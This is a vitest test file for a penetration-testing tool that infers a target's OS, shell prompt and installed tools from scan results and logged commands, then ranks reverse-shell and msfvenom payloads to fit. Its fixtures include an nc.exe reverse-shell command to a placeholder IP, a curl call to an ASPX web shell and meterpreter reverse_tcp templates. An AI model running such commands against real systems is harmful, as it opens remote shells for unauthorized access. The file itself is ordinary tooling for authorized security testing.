import { describe, expect, it } from "vitest";
import { inferContext, inferSituation, rankPayloads, type PayloadSituation } from "../../../engines/payloads/fit";
import { MSFVENOM } from "../../../engines/payloads/msfvenom";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";
import type { PayloadDef } from "../../../engines/payloads/types";
import type { Host } from "../../../types/host";
import type { LogEntry } from "../../../types/log";
import type { Service } from "../../../types/service";

const host = (over: Partial<Host> = {}): Host => ({
  id: "h1", engagementId: "e1", name: "TARGET-A", ip: "198.51.100.5", os: null, boardColumn: "initial-foothold",
  boardManual: false, access: "none", createdAt: 0, updatedAt: 0, dualHomed: false, boardDerived: null,
  accessReviewedAt: null, adSet: null, adSetEffective: false, ...over,
});
const svc = (port: number, name: string, version: string | null, over: Partial<Service> = {}): Service => ({
  id: `s${port}`, hostId: "h1", port, protocol: "tcp", state: "open", nmapService: name, nmapVersion: version,
  confirmedProduct: null, confirmedVersion: null, confirmedEntryId: null, verdict: null, createdAt: 0, updatedAt: 0, ...over,
});
const at1402 = new Date(2026, 10, 7, 14, 2).getTime();
const cmdEntry = (command: string, output: string, at = at1402, kind: "command" | "http" = "command"): LogEntry => ({
  id: `l${at}`, engagementId: "e1", kind, title: "t", titleEdited: false, ranOn: null, hostIds: ["h1"],
  observations: null, returnedNothing: false, private: false, at, createdAt: at, updatedAt: at,
  content: kind === "command" ? { kind: "command", blocks: [{ command, output }] } : { kind: "http", request: command, response: output },
});
const base: PayloadSituation = {
  os: null, services: [], prompt: null, webShellUrl: null, tools: { present: [], absent: [] },
  failedPayloadIds: [], exam: false, dbEngine: null,
};
const ids = (defs: PayloadDef[]) => defs.map((d) => d.id);

describe("fit engine", () => {
  it("IIS + logged ?cmd= URL infers windows + webshell-param, best fit ps-b64", () => {
    const { situation, evidence } = inferSituation({
      host: host(), services: [svc(80, "http", "Microsoft IIS httpd 10.0")],
      entries: [cmdEntry("curl 'http://198.51.100.5/shell.aspx?cmd=whoami'", "")], examKind: false,
    });
    expect(situation.os).toBe("windows");
    expect(evidence.os).toBe("from nmap (Microsoft IIS httpd 10.0 on 80)");
    expect(situation.webShellUrl).toBe("http://198.51.100.5/shell.aspx?cmd=");
    expect(evidence.webShellUrl).toBe("from your 14:02 log entry");
    const ctx = inferContext(situation);
    expect(ctx).toBe("webshell-param");
    expect(rankPayloads(REVERSE_SHELLS, situation, ctx).fits[0].id).toBe("ps-b64");
  });

  it("a logged nc.exe payload marked failed folds nc-exe with 'Failed here before'", () => {
    // Task 6 adds LogEntry.payloadId; inferSituation will fill failedPayloadIds then.
    const s = { ...base, os: "windows" as const, failedPayloadIds: ["nc-exe"] };
    const r = rankPayloads(REVERSE_SHELLS, s, null);
    expect(ids(r.fits)).not.toContain("nc-exe");
    expect(r.misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Failed here before");
  });

  it("absent python3 folds python3", () => {
    const { situation } = inferSituation({
      host: host({ os: "linux" }), services: [],
      entries: [cmdEntry("which python3 python", "")], examKind: false,
    });
    expect(situation.tools.absent).toEqual(expect.arrayContaining(["python3", "python"]));
    const r = rankPayloads(REVERSE_SHELLS, situation, null);
    expect(r.misfits.find((m) => m.def.id === "python3")?.reason).toBe("Needs python3, which isn't on this box");
  });

  it("os null lists both OSes as fits and context null, nothing empty", () => {
    const { situation } = inferSituation({ host: host(), services: [], entries: [], examKind: false });
    expect(situation.os).toBeNull();
    expect(inferContext(situation)).toBeNull();
    const r = rankPayloads(REVERSE_SHELLS, situation, null);
    expect(r.misfits).toEqual([]);
    expect(ids(r.fits)).toEqual(ids(REVERSE_SHELLS));
  });

  it("prompt 'PS C:\\>' in the latest output infers powershell", () => {
    const { situation, evidence } = inferSituation({
      host: host({ os: "windows" }), services: [],
      entries: [
        cmdEntry("old", "C:\\Users\\a>", at1402 - 60000),
        cmdEntry("whoami", "example\\svc\nPS C:\\Users\\svc> ", at1402),
      ], examKind: false,
    });
    expect(situation.prompt).toBe("ps");
    expect(evidence.prompt).toBe("from your 14:02 log entry");
    expect(inferContext(situation)).toBe("powershell");
  });

  it("detects cmd and sh prompts", () => {
    const f = (out: string) => inferSituation({ host: host(), services: [], entries: [cmdEntry("x", out)], examKind: false }).situation.prompt;
    expect(f("C:\\inetpub>")).toBe("cmd");
    expect(f("www-data@web01:/var/www$ ")).toBe("sh");
    expect(f("root@web01:/# ")).toBe("sh");
    expect(f("just output")).toBeNull();
  });

  it("reads tools from linPEAS Useful software and which output only", () => {
    const peas = "╔══════════╣ Useful software\n/usr/bin/nc\n/usr/bin/python3\n/usr/bin/gcc\n╔══════════╣ Other\n/usr/bin/curl";
    const { situation } = inferSituation({
      host: host({ os: "linux" }), services: [],
      entries: [cmdEntry("./linpeas.sh", peas), cmdEntry("which php", ""), cmdEntry("which perl", "/usr/bin/perl")], examKind: false,
    });
    expect(situation.tools.present).toEqual(expect.arrayContaining(["nc", "python3", "gcc", "perl"]));
    expect(situation.tools.present).not.toContain("curl");
    expect(situation.tools.absent).toEqual(["php"]);
    const none = inferSituation({ host: host(), services: [], entries: [cmdEntry("echo php nc", "")], examKind: false });
    expect(none.situation.tools).toEqual({ present: [], absent: [] });
  });

  it("infers db engine and linux from services", () => {
    const { situation, evidence } = inferSituation({
      host: host(), services: [svc(22, "ssh", "OpenSSH 8.2p1 Ubuntu 4ubuntu0.5"), svc(3306, "mysql", "MySQL 8.0")],
      entries: [], examKind: true,
    });
    expect(situation.os).toBe("linux");
    expect(situation.dbEngine).toBe("mysql");
    expect(evidence.dbEngine).toBe("from nmap (mysql on 3306)");
    expect(situation.exam).toBe(true);
  });

  it("host OS 'other' maps to null", () => {
    expect(inferSituation({ host: host({ os: "other" }), services: [], entries: [], examKind: false }).situation.os).toBeNull();
  });

  it("misfit reasons in precedence order; wrong OS first", () => {
    const s = { ...base, os: "linux" as const, failedPayloadIds: ["nc-exe"], tools: { present: [], absent: ["nc.exe"] } };
    const r = rankPayloads(REVERSE_SHELLS, s, "bash-prompt");
    const reason = (id: string) => r.misfits.find((m) => m.def.id === id)?.reason;
    expect(reason("nc-exe")).toBe("Wrong OS (linux)");
    expect(reason("ps-b64")).toBe("Wrong OS (linux)");
    const w = rankPayloads(REVERSE_SHELLS, { ...base, os: "windows" }, "bash-prompt");
    expect(w.misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Doesn't work in Bash prompt");
    const nc = rankPayloads(REVERSE_SHELLS, { ...base, os: "windows", tools: { present: [], absent: ["nc.exe"] } }, null);
    expect(nc.misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Needs nc with -e, which isn't on this box");
  });

  it("keeps catalogue order among fits and sends non-matching contexts to misfits", () => {
    const s = { ...base, os: "linux" as const };
    const r = rankPayloads([...REVERSE_SHELLS].reverse(), s, "bash-prompt");
    expect(ids(r.fits)).toEqual(ids([...REVERSE_SHELLS].reverse().filter((d) => d.os === "linux")));
    const only = rankPayloads(REVERSE_SHELLS, { ...base, os: null }, "cmd");
    expect(ids(only.fits)).toEqual(["ps-b64", "nishang-cradle", "nc-exe"]);
  });

  it("a mid-output # or $ line does not set a prompt; bash-5.1$ and sh-4.4$ do", () => {
    const f = (out: string) => inferSituation({ host: host(), services: [], entries: [cmdEntry("x", out)], examKind: false }).situation.prompt;
    expect(f("# comment\n$\n/dev/sda1 / ext4\nlast line")).toBeNull();
    expect(f("#\nsomething")).toBeNull();
    expect(f("bash-5.1$ ")).toBe("sh");
    expect(f("sh-4.4$")).toBe("sh");
  });

  it("which parsing handles compound and redirected forms", () => {
    const { situation } = inferSituation({
      host: host(), services: [],
      entries: [cmdEntry("which python3; which php 2>/dev/null || which nc", "/usr/bin/python3\n/usr/bin/nc")], examKind: false,
    });
    expect(situation.tools.present.sort()).toEqual(["nc", "python3"]);
    expect(situation.tools.absent).toEqual(["php"]);
  });

  it("entries run elsewhere are ignored; a newer prompt-less entry keeps the prompt", () => {
    const { situation } = inferSituation({
      host: host({ name: "TARGET-A" }), services: [],
      entries: [
        cmdEntry("whoami", "PS C:\\Users\\svc>", at1402 - 120000),
        cmdEntry("./linpeas.sh", "lots of output\nno prompt here", at1402),
        { ...cmdEntry("id", "user@kali:~$", at1402 + 1000), ranOn: "kali" },
      ], examKind: false,
    });
    expect(situation.prompt).toBe("ps");
    const own = inferSituation({
      host: host({ name: "TARGET-A" }), services: [],
      entries: [{ ...cmdEntry("id", "www@web01:/tmp$", at1402), ranOn: "TARGET-A" }], examKind: false,
    });
    expect(own.situation.prompt).toBe("sh");
  });

  it("only open services count for OS and db engine", () => {
    const { situation } = inferSituation({
      host: host(), services: [svc(80, "http", "Microsoft IIS httpd 10.0", { state: "closed" }), svc(3306, "mysql", null, { state: "filtered" })],
      entries: [], examKind: false,
    });
    expect(situation.os).toBeNull();
    expect(situation.dbEngine).toBeNull();
    expect(situation.services).toEqual([]);
    expect(inferSituation({ host: host(), services: [svc(3306, "mysql", null, { state: "OPEN" })], entries: [], examKind: false }).situation.dbEngine).toBe("mysql");
  });

  it("exam folds meterpreter or staged defs", () => {
    const meter: PayloadDef = { ...REVERSE_SHELLS[0], id: "meter", template: "msfvenom -p windows/x64/meterpreter/reverse_tcp" };
    const staged: PayloadDef = { ...REVERSE_SHELLS[0], id: "staged", template: "msfvenom -p windows/x64/shell/reverse_tcp" };
    const stageless: PayloadDef = { ...REVERSE_SHELLS[0], id: "stageless", template: "msfvenom -p windows/x64/shell_reverse_tcp" };
    const r = rankPayloads([meter, staged, stageless], { ...base, exam: true }, null);
    expect(ids(r.fits)).toEqual(["stageless"]);
    expect(r.misfits.map((m) => m.reason)).toEqual(["Not allowed in the exam", "Not allowed in the exam"]);
    expect(ids(rankPayloads([meter], base, null).fits)).toEqual(["meter"]);
    const noted: PayloadDef = { ...stageless, id: "noted", title: "Staged? no", notes: ["never meterpreter"] };
    expect(ids(rankPayloads([noted], { ...base, exam: true }, null).fits)).toEqual(["noted"]);
  });
});

describe("service preference (spec §4.2): a soft sort key, never a fold", () => {
  const situationFor = (services: Service[]) => inferSituation({ host: host(), services, entries: [], examKind: false }).situation;

  it("IIS puts the ASPX first; the rest keep catalogue order", () => {
    const s = situationFor([svc(80, "http", "Microsoft IIS httpd 10.0")]);
    const r = rankPayloads(MSFVENOM, s, null);
    const windows = ids(MSFVENOM.filter((d) => d.os === "windows"));
    expect(ids(r.fits)).toEqual(["msf-win-x64-aspx", ...windows.filter((id) => id !== "msf-win-x64-aspx")]);
    expect(r.misfits.map((m) => m.def.id)).toEqual(ids(MSFVENOM.filter((d) => d.os === "linux")));
  });

  it("Tomcat puts the WAR first", () => {
    const s = situationFor([svc(22, "ssh", "OpenSSH 8.9p1 Ubuntu 3"), svc(8080, "http", "Apache Tomcat/Coyote JSP engine 1.1")]);
    expect(s.os).toBe("linux");
    expect(ids(rankPayloads(MSFVENOM, s, null).fits)).toEqual(["msf-java-war-linux", "msf-linux-x64-elf"]);
  });

  it("Apache/PHP leaves msfvenom alone and puts php-exec first among the reverse shells", () => {
    const s = situationFor([svc(80, "http", "Apache httpd 2.4.52 ((Ubuntu))")]);
    expect(ids(rankPayloads(MSFVENOM, s, null).fits)).toEqual(["msf-linux-x64-elf", "msf-java-war-linux"]);
    const linux = ids(REVERSE_SHELLS.filter((d) => d.os === "linux"));
    expect(ids(rankPayloads(REVERSE_SHELLS, s, null).fits)).toEqual(["php-exec", ...linux.filter((id) => id !== "php-exec")]);
    // Tomcat's "Apache" is not Apache httpd.
    const tomcat = situationFor([svc(8080, "http", "Apache Tomcat/Coyote JSP engine 1.1")]);
    expect(rankPayloads(REVERSE_SHELLS, tomcat, null).fits[0]!.id).toBe("bash-tcp");
  });

  it("no services: catalogue order", () => {
    expect(ids(rankPayloads(MSFVENOM, base, null).fits)).toEqual(ids(MSFVENOM));
    expect(ids(rankPayloads(REVERSE_SHELLS, base, null).fits)).toEqual(ids(REVERSE_SHELLS));
  });
});

describe("failure memory wiring", () => {
  it("a logged failed nc-exe entry folds nc-exe with 'Failed here before'", () => {
    const failed: LogEntry = { ...cmdEntry("nc.exe 192.0.2.10 443 -e cmd", "Access is denied."), payloadId: "nc-exe" };
    const { situation } = inferSituation({ host: host(), services: [], entries: [failed], examKind: false });
    expect(situation.failedPayloadIds).toEqual(["nc-exe"]);
    const { fits, misfits } = rankPayloads(REVERSE_SHELLS, situation, null);
    expect(ids(fits)).not.toContain("nc-exe");
    expect(misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Failed here before");
  });
});
